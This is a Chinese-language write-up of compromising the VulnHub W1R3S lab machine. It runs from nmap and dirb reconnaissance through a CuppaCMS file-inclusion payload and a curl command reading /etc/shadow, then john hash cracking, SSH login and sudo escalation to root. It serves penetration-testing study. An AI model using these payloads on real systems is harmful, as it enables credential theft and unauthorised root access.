### 靶机描述
_这是vulnhub一台中级级别的靶机。设计者要求我们拿下靶机的root权限并且获得/root目录下flag.txt文件。_
![靶机描述](vulnhubScreenShot/w1r3s/Screenshot_2026-07-17_04_25_40.png)
下载地址：
```text
https://download.vulnhub.com/w1r3s/w1r3s.v1.0.1.zip
```

### 侦察和信息搜集
首先，现在kali本地建立文件夹w1r3s，存放整个过程中思路和痕迹。以便于工作留痕和攻击链构造。然后新建一个文件夹存放信息收集的结果。我这边文件夹名是information_gather。
然后确认本机的IP地址为192.168.2.24。

#### nmap扫描
##### 主机发现

```zsh
sudo nmap -sn 192.168.2.0/24
```

这是执行结果：
```text
# Nmap 7.98 scan initiated Fri Jul 17 04:46:32 2026 as: /usr/lib/nmap/nmap -sn -oA ./host_dis 192.168.2.0/24
Nmap scan report for 192.168.2.1
Host is up (0.00037s latency).
MAC Address: 00:50:56:C0:00:01 (VMware)
Nmap scan report for 192.168.2.2
Host is up (0.00034s latency).
MAC Address: 00:50:56:FF:4B:B2 (VMware)
Nmap scan report for 192.168.2.34
Host is up (0.00040s latency).
MAC Address: 00:0C:29:D2:6E:26 (VMware)
Nmap scan report for 192.168.2.254
Host is up (0.00034s latency).
MAC Address: 00:50:56:E4:90:03 (VMware)
Nmap scan report for 192.168.2.24
Host is up.
# Nmap done at Fri Jul 17 04:46:36 2026 -- 256 IP addresses (5 hosts up) scanned in 4.55 seconds
```
由于当前环境为本地实验环境，通过mac比对可以迅速判定这台34的机子是我的目标。在攻防环境下还需要额外的确认和协商行动授权的范围。
##### 端口扫描 
```zsh
sudo nmap --min-rate=10000 -p- 192.168.2.34
```
执行结果：
```text
# Nmap 7.98 scan initiated Thu Jul 16 03:46:31 2026 as: /usr/lib/nmap/nmap --min-rate=10000 -p- -oA TCPports 192.168.2.34
Nmap scan report for 192.168.2.34
Host is up (0.00024s latency).
Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 00:0C:29:D2:6E:26 (VMware)

# Nmap done at Thu Jul 16 03:46:44 2026 -- 1 IP address (1 host up) scanned in 12.99 seconds
```

_(考虑到实战环境中，由于网络丢包和延迟的因素，这条命令的执行结果未必准确。我们往往需要再执行一遍这条命令。但是现在在本地虚拟机环境下，这样的因素可以忽略。)_
这条命令执行的是tcp扫描。tcp是面向链接的协议。能保证网络传输的完整性，可靠性。因此，这条命令发现的结果具有很强的可信度。
下面执行udp扫描
```text
# Nmap 7.98 scan initiated Thu Jul 16 03:47:31 2026 as: /usr/lib/nmap/nmap -sU --min-rate=10000 -p- -oA UDPports 192.168.2.34
Nmap scan report for 192.168.2.34
Host is up (0.00047s latency).
Not shown: 65534 open|filtered udp ports (no-response)
PORT     STATE  SERVICE
3306/udp closed mysql
MAC Address: 00:0C:29:D2:6E:26 (VMware)

# Nmap done at Thu Jul 16 03:47:45 2026 -- 1 IP address (1 host up) scanned in 13.96 seconds
```
_(为什么使用udp扫描？这是考虑到网络协议中某些协议会使用一个端口使用两种传输层协议。比如DNS的53端口，一般情况下使用udp，特定情况下，比如axfr功能就会使用TCP进行区域传输。所以使用udp扫描非常有必要。)_
目前确认目标逐渐开放21，22，80，3306端口。也就是ftp，ssh，http，mysql这些服务。我想进一步知道详细版本信息。
![详细扫描](vulnhubScreenShot/w1r3s/2026-07-17-051415_2560x1600_scrot.png)
这里可以看到目标的ftp服务支持匿名登录，并且暴露了一些文件。这里-sC是指定使用默认脚本扫描。如果当前运行的服务有nday或者说配置错误，我们就可能拿到立足点。所以为了获取这些"低摘的果子"，我们运行漏洞脚本扫描。
```text
# Nmap 7.98 scan initiated Thu Jul 16 03:48:51 2026 as: /usr/lib/nmap/nmap --script=vuln -p21,22,80,3306 -oA vulnga 192.168.2.34
Nmap scan report for 192.168.2.34
Host is up (0.00082s latency).

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-enum: 
|_  /wordpress/wp-login.php: Wordpress login page.
3306/tcp open  mysql
MAC Address: 00:0C:29:D2:6E:26 (VMware)

# Nmap done at Thu Jul 16 03:54:13 2026 -- 1 IP address (1 host up) scanned in 321.85 seconds

```
可以看到脚本http枚举中，80端口运行这wordpress站点。目前我掌握信息情况如下，ftp支持匿名登录；http有wordpress站点。考虑到，我对于ftp的操作不是很熟悉。需要花点时间看文档帮助才能达到行动要求。所以这里想考虑从我最熟悉的wordpress站点下手。_(为什么不考虑22和3306？因为3306的数据库端通常都是只能本地访问，而ssh端口的渗透通常不是首选。)_

### web渗透
发现一个登录页面，编个用户进行登录
![wp站点](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-17-17-32-15.png)
点击登录后发现
![无法访问](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-17-17-32-55.png)
发现服务器不响应。访问页面源代码看一下具体原因
![原因检查](kali-linux-2026.1-vmware-amd64-2026-07-17-17-48-46.png)
发现表单提交给http://localhost/wordpress/wp-login.php这个url。localhost是本地主机的意思，怪不得没返回呢。这里我猜测的原因是站长进行网站迁移，wordpress站点可能被拿掉，从而运行新的网站。而这个wp-login.php则是原始测试环境所遗留的。但是站长忘记删除这个原本自带的文件了。也有可能没有被拿掉，只是资源路径我并不知道。_(这里的表单资源提交给localhost的操作很符合这一行为)_ 
无论是那个路径，目前我都必须知道这个web服务器更多的路径资源信息。因此我们需要进行网站目录爆破。

#### DirB 目录爆破
```text

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: url_exploit.txt
START_TIME: Thu Jul 16 03:53:41 2026
URL_BASE: http://192.168.2.34:80/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.2.34:80/ ----
==> DIRECTORY: http://192.168.2.34:80/administrator/
+ http://192.168.2.34:80/index.html (CODE:200|SIZE:11321)
==> DIRECTORY: http://192.168.2.34:80/javascript/
+ http://192.168.2.34:80/server-status (CODE:403|SIZE:300)
==> DIRECTORY: http://192.168.2.34:80/wordpress/

---- Entering directory: http://192.168.2.34:80/administrator/ ----
==> DIRECTORY: http://192.168.2.34:80/administrator/alerts/
==> DIRECTORY: http://192.168.2.34:80/administrator/api/
==> DIRECTORY: http://192.168.2.34:80/administrator/classes/
==> DIRECTORY: http://192.168.2.34:80/administrator/components/
==> DIRECTORY: http://192.168.2.34:80/administrator/extensions/
+ http://192.168.2.34:80/administrator/index.php (CODE:302|SIZE:6946)
==> DIRECTORY: http://192.168.2.34:80/administrator/installation/
==> DIRECTORY: http://192.168.2.34:80/administrator/js/
==> DIRECTORY: http://192.168.2.34:80/administrator/language/
==> DIRECTORY: http://192.168.2.34:80/administrator/media/
+ http://192.168.2.34:80/administrator/robots.txt (CODE:200|SIZE:26)
==> DIRECTORY: http://192.168.2.34:80/administrator/templates/

---- Entering directory: http://192.168.2.34:80/javascript/ ----
==> DIRECTORY: http://192.168.2.34:80/javascript/jquery/

---- Entering directory: http://192.168.2.34:80/wordpress/ ----
+ http://192.168.2.34:80/wordpress/index.php (CODE:200|SIZE:55843)
==> DIRECTORY: http://192.168.2.34:80/wordpress/wp-admin/
==> DIRECTORY: http://192.168.2.34:80/wordpress/wp-content/
==> DIRECTORY: http://192.168.2.34:80/wordpress/wp-includes/
+ http://192.168.2.34:80/wordpress/xmlrpc.php (CODE:405|SIZE:42)

---- Entering directory: http://192.168.2.34:80/administrator/alerts/ ----
+ http://192.168.2.34:80/administrator/alerts/index.html (CODE:200|SIZE:31)

---- Entering directory: http://192.168.2.34:80/administrator/api/ ----
==> DIRECTORY: http://192.168.2.34:80/administrator/api/administrator/
+ http://192.168.2.34:80/administrator/api/index.php (CODE:200|SIZE:62)
==> DIRECTORY: http://192.168.2.34:80/administrator/api/test/

---- Entering directory: http://192.168.2.34:80/administrator/classes/ ----
==> DIRECTORY: http://192.168.2.34:80/administrator/classes/ajax/
+ http://192.168.2.34:80/administrator/classes/index.html (CODE:200|SIZE:31)

---- Entering directory: http://192.168.2.34:80/administrator/components/ ----
==> DIRECTORY: http://192.168.2.34:80/administrator/components/configuration/
+ http://192.168.2.34:80/administrator/components/index.html (CODE:200|SIZE:31)
==> DIRECTORY: http://192.168.2.34:80/administrator/components/menu/
==> DIRECTORY: http://192.168.2.34:80/administrator/components/stats/

---- Entering directory: http://192.168.2.34:80/administrator/extensions/ ----
==> DIRECTORY: http://192.168.2.34:80/administrator/extensions/banners/
==> DIRECTORY: http://192.168.2.34:80/administrator/extensions/content/
+ http://192.168.2.34:80/administrator/extensions/index.html (CODE:200|SIZE:31)

---- Entering directory: http://192.168.2.34:80/administrator/installation/ ----
==> DIRECTORY: http://192.168.2.34:80/administrator/installation/html/
+ http://192.168.2.34:80/administrator/installation/index.php (CODE:200|SIZE:4322)

---- Entering directory: http://192.168.2.34:80/administrator/js/ ----
==> DIRECTORY: http://192.168.2.34:80/administrator/js/filemanager/
+ http://192.168.2.34:80/administrator/js/index.html (CODE:200|SIZE:31)
==> DIRECTORY: http://192.168.2.34:80/administrator/js/jquery/
==> DIRECTORY: http://192.168.2.34:80/administrator/js/tiny_mce/

....(报错忽略)....
---- Entering directory: http://192.168.2.34:80/wordpress/wp-admin/ ----
+ http://192.168.2.34:80/wordpress/wp-admin/admin.php (CODE:302|SIZE:0)
==> DIRECTORY: http://192.168.2.34:80/wordpress/wp-admin/css/
==> DIRECTORY: http://192.168.2.34:80/wordpress/wp-admin/images/
==> DIRECTORY: http://192.168.2.34:80/wordpress/wp-admin/includes/
+ http://192.168.2.34:80/wordpress/wp-admin/index.php (CODE:302|SIZE:0)
==> DIRECTORY: http://192.168.2.34:80/wordpress/wp-admin/js/
==> DIRECTORY: http://192.168.2.34:80/wordpress/wp-admin/maint/
==> DIRECTORY: http://192.168.2.34:80/wordpress/wp-admin/network/
==> DIRECTORY: http://192.168.2.34:80/wordpress/wp-admin/user/

---- Entering directory: http://192.168.2.34:80/wordpress/wp-content/ ----
+ http://192.168.2.34:80/wordpress/wp-content/index.php (CODE:200|SIZE:0)
==> DIRECTORY: http://192.168.2.34:80/wordpress/wp-content/plugins/
==> DIRECTORY: http://192.168.2.34:80/wordpress/wp-content/themes/
==> DIRECTORY: http://192.168.2.34:80/wordpress/wp-content/upgrade/
==> DIRECTORY: http://192.168.2.34:80/wordpress/wp-content/uploads/

....(报错忽略)....
---- Entering directory: http://192.168.2.34:80/wordpress/wp-admin/network/ ----
+ http://192.168.2.34:80/wordpress/wp-admin/network/admin.php (CODE:302|SIZE:0)
+ http://192.168.2.34:80/wordpress/wp-admin/network/index.php (CODE:302|SIZE:0)

---- Entering directory: http://192.168.2.34:80/wordpress/wp-admin/user/ ----
+ http://192.168.2.34:80/wordpress/wp-admin/user/admin.php (CODE:302|SIZE:0)
+ http://192.168.2.34:80/wordpress/wp-admin/user/index.php (CODE:302|SIZE:0)

---- Entering directory: http://192.168.2.34:80/wordpress/wp-content/plugins/ ----
+ http://192.168.2.34:80/wordpress/wp-content/plugins/index.php (CODE:200|SIZE:0)

---- Entering directory: http://192.168.2.34:80/wordpress/wp-content/themes/ ----
+ http://192.168.2.34:80/wordpress/wp-content/themes/index.php (CODE:200|SIZE:0)
....(报错忽略)....
-----------------
END_TIME: Thu Jul 16 03:54:30 2026
DOWNLOADED: 78404 - FOUND: 22
```
许多空白页面而且没有标准性图片。给人一种“匆忙删除网站，并且很粗心留了很多原始配置文件”。
![错误](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-17-18-30-20.png)
![泄露路径](vulnhubScreenShot/w1r3s/Screenshot_2026-07-16_04_18_14.png)
查看robots.txt内容。robots是爬虫的”君子协议“。里面记录的内容是不允许搜索引擎爬虫获取的，一般都是私密，不想让别人知道的资源链接。如果按照我之前所想的，这个robots.txt文件很肯记录了新的wordpress登录站点url。可惜当我访问时，啥也没有。
![爬虫协议](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-17-18-30-31.png)
我感觉我这条路行不通，可能就是网址就是没了。但是，一个建站页面引起我的兴趣。
![建站页面](vulnhubScreenShot/w1r3s/Screenshot_2026-07-16_04_10_09.png)
可能当前网站运行的是CuppaCMS。使用searchsploit搜索一下漏洞利用
![漏洞利用](vulnhubScreenShot/w1r3s/2026-07-16-041325_2560x1600_scrot.png)
使用-m参数将25971.txt文件拷贝到本地文件夹。这个漏洞能够包含本地文件和远程文件。根据利用文件，开始构造利用。
![利用信息](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-17-20-46-02.png)
漏洞利用点为“/alerts/alertConfigField.php?urlConfig=”，回顾之前目录爆破的结果，只有这个网址匹配的上。这里使用mousepad打开使用Ctrl F键查找“/alerts”
![利用点查找](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-17-20-51-01.png)
构造payload
```text
http://192.168.2.34:80/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```
执行有结果，但是没有返回系统信息
![卡住了](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-17-20-55-57.png)
这里我卡住了，我尝试了构造这个利用文件的所有payload，但是服务器依旧返回这个界面。我想要放弃这条路，但是“/alerts匹配并有回显”这个迹象告诉我，服务器上真有这个漏洞文件alertConfigField.php。我看了红笔的视频后，验证了我的思路。这里文件给出了网站CMS的源代码地址，或许需要查看一下代码细节。
#### CuppaCMS代码审计
searchsploit给出的源码文件地址已经找不到了。借助谷歌搜索一下历史源码信息。目前没有Cuppa版本信息。但是13年的漏洞，采用php5.3。可以排除官网上面比较新的版本。我们选择下方的GitHub版本
![Chrome](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-17-21-09-38.png)
![1](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-17-21-09-38.png)
![github](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-17-21-10-59.png)

只是按照利用文件，第22行不是’<?php include($_REQUEST["urlConfig"]); ?>‘
![error](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-17-21-11-09.png)
![origin](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-17-21-19-45.png)

经过简单的审计，Cuppa CMS后面修改为POST方式提交，但是还是没有修复漏洞。
![success](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-17-21-11-19.png)
这块代码与服务器的函数特征还是比较匹配，推测这一版和服务上跑的那一版差别不大。
![pattern](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-17-21-31-26.png)
构造payload，使用curl工具，构造POST方式提交请求
```text
curl -i --data-urlencode "urlConfig=../../../../../../../../../etc/shadow" http://192.168.2.34/administrator/alerts/alertConfigField.php
```
![execute](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-17-21-34-10.png)
![res](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-17-21-34-43.png)

尝试一下远程文件读取
![webshell](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-17-21-57-10.png)
没有任何回显.执行失败
![executeerror](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-17-21-57-30.png)
看来使用文件包含执行远程webshell这个思路行不通，还是老老实实爆破密码吧！
### john哈希碰撞
![破解结果](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-18-09-06-38.png)
w1r3s用户密码先被破解出来了，此时root用户的密码还在跑。其实包括我在内，对于liunx主机登录的密码和ssh账号登录的密码，许多人会设置成一样的。这样给了我们获得立足点的口子。
我们登录ssh。
### 获得立足点
使用破解的账号密码登录ssh,提示我们这是条正确的路线。下面考虑提权
![stepstone](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-18-09-14-29.png)

### 权限提升
通过命令
```text
sudo -l
```
查看当前用户的环境，发现当前用户可以随意使用root用户权限做任何事情。
![权限枚举](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-18-13-10-35.png)
使用sudo运行一个root的bash会话。查看root目录下的flag.txt文件，完成！
![loot](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-18-13-14-23.png)

### 21端口ftp尝试
目标21端口支持匿名用户登录。我们可以使用anonymous账号登录服务器下载文件。
``` zsh
man ftp
```
看了一下ftp工具手册，得到open参数用于建立远程文件服务器的链接。
![ftp1](vulnhubScreenShot/w1r3s/Screenshot_2026-07-17_03_46_03.png)
![ftp2](vulnhubScreenShot/w1r3s/Screenshot_2026-07-17_03_45_24.png)
得到开放文件信息
![inf](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-18-13-26-22.png)
第一串字符使用工具识别后为MD5，第二串字符很像是base64编码。_(后面出现标志性\=\=, )_
从网站上破解MD5字符串。
![crack](vulnhubScreenShot/w1r3s/Screenshot_2026-07-17_04_24_37.png)
![crack2](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-18-13-33-02.png)
我获得到的信息如下
```
This is not a password(这个不是密码。)
It is easy, but not that easy..(很简单，但是没那么简单..)
```
暗示我们这条路不通。
看一下其他两个文件
![text](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-18-13-38-01.png)
第一个employee_name文件给出了员工名，而下面两行字符明显颠倒了。这里采用一些工具还原字符。
使用google搜索
![page1](vulnhubScreenShot/w1r3s/Screenshot_2026-07-17_03_41_14.png)
不好用。换一个
![page2](vulnhubScreenShot/w1r3s/Screenshot_2026-07-17_03_41_02.png)
![page3](vulnhubScreenShot/w1r3s/Screenshot_2026-07-17_03_40_39.png)
我获得信息如下
```text
I don't think is the way to root!(我不认为这能root)
we have lot of work to do stop playing around...(我们还有很多要完成的工作，别闲逛了...)
```
这条路行不通。

### 22端口ssh暴力破解
不到万不得已，ssh破解的优先级应该是最后的。这里我们构造字典，使用hydra进行暴力破解。
![zone](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-18-14-05-28.png)
使用hydra的期间多次调整字典
![hydra](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-18-14-17-49.png)
完成。

### 反思和学习
-  **1** 使用nmap进行端口扫描时，应该使用-sT扫描。
   ```shell
   sudo nmap --min-rate=10000 -p- 192.168.2.34
   ```
   这条命令默认使用-sS扫描各个端口。也就是只使用TCP SYN请求判断响应而不建立链接。许多防火墙会拦截识别这个行为。没法做到稳定和隐蔽。如果在效率能保证的前提下，可以使用sT选项。
- **2** 使用nmap -sn参数的原理。
   这个参数会使nmap枚举出网络中有响应的主机ip地址。与sL不同的是，sn具有轻量的入侵性质。sL仅是简单枚举ip地址，不会发送包。而sn在root权限下，unix操作系统上会会发送icmp回显包(ping),443端口的TCP的SYN包，80端口的TCPACK包，icmp请求时间戳包，而且默认会发送arp请求等。前者的ping包容易被过滤。而后者时间戳响应包很少过滤。许多管理员也使用该命令。
   在虚拟机环境中，此时目标与本机处于统一网段。因此-sn的执行会发生arp请求包。
   ```shell
   sudo arp-scan -l
   ```
   原理和这条命令很相像。-sn也可以替换为其他参数，--send-ip将会发送icmp时间戳请求包，而不发送arp请求包。结合nmap文档搭配，有较大的概率过防火墙。
- **3** 在进行端口扫描时，巧用参数设置简化端口输入
  在第三号将命令执行的结果作为参数，然后-p选项写$参数，按tab按键就可以补全执行。这个扫描是整个nmap过程中最重的一次，也是最重要的一次。
   ![operator](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-18-16-54-28.png)
   
- **4** 实际上还要进行ipv6的扫描，这里并没有执行这个操作。
- **5** 最后最好展示主机名，ip地址等信息来显示成果。
- **6** 权限讲解
   ![权限枚举](vulnhubScreenShot/w1r3s/kali-linux-2026.1-vmware-amd64-2026-07-18-13-10-35.png)
这里的env_reset表示执行 sudo 时重置环境变量，防止普通用户通过劫持环境变量提权。下方三个ALL，第一个表示可以切换到任意用户，第二个表示可以切换到任意组，第二个表示可以执行任意命令。

### 总结
首先信息收集发现目标开发21，22，80，3306等端口服务。21端口的ftp服务器 _(vsFTPd 3.0.3,d表示驻守后台)_ 支持匿名用户登录，有部分文件信息泄露。80端口运行Cuppa CMS服务和一些残留的wordpress站点。同搜索，发现CMS的一个文件包含漏洞。经过读取敏感文件/etc/shadow,得到MD5加密后的密码。使用john工具配合rockyou字典得到用户w1r3s用户密码computer。基于密码膨胀的思路成功登录上ssh服务器。经过权限枚举，发现sudo的错误配置，成功提权到root用户，最终获得flag.txt。
此外，w1r3s这个是wires它的leetspeak写法。黑客文化，第一次接触，十分新颖。


